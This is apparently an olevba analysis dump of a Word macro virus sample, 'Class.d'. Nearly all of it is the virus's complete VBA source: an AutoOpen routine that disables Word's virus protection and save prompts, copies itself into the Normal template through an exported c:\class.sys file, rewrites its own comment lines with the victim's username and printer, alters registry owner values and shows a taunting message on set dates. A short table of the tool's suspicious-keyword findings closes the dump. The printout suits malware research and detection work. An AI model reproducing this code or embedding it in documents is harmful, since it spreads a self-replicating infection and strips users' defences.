olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-6506bdab40d3f1aa0def32cbbefca5cde85c34e37a92895d4eb2aa9fe8d58609
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-6506bdab40d3f1aa0def32cbbefca5cde85c34e37a92895d4eb2aa9fe8d58609 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Const REG_SZ As Long = 1
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Const HKEY_CURRENT_USER As Long = &H80000001
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Sub AutoOpen()
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
On Error GoTo out
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Options.VirusProtection = False
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Options.SaveNormalPrompt = False
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Options.ConfirmConversions = False
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
If nt > 70 And ad > 0 Then GoTo out
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
If nt < 70 Then
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
End If
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
host.codemodule.AddFromFile ("c:\class.sys")
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
With host.codemodule
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    For x = 1 To 16
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    .deletelines 1
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    Next x
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
End With
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
If nt < 70 Then
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    With host.codemodule
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    .replaceline 1, "Sub AutoClose()"
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    .replaceline 91, "Sub ToolsMacro()"
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    For x = 70 To 81
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
        .deletelines 62
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    Next x
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    .replaceline 35, "    For x = 1 To 4"
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    End With
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
End If
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
If nt < 70 Then
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
u = RegCloseKey(k)
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
End If
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
With host.codemodule
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    For x = 2 To 104 Step 2
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
    Next x
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
End With
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
out:
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
End Sub
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
Sub ViewVBCode()
'Rick Levis12/28/99 5:29:02 AMHP LaserJet 5M on LPT1:CAPGAIN4
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

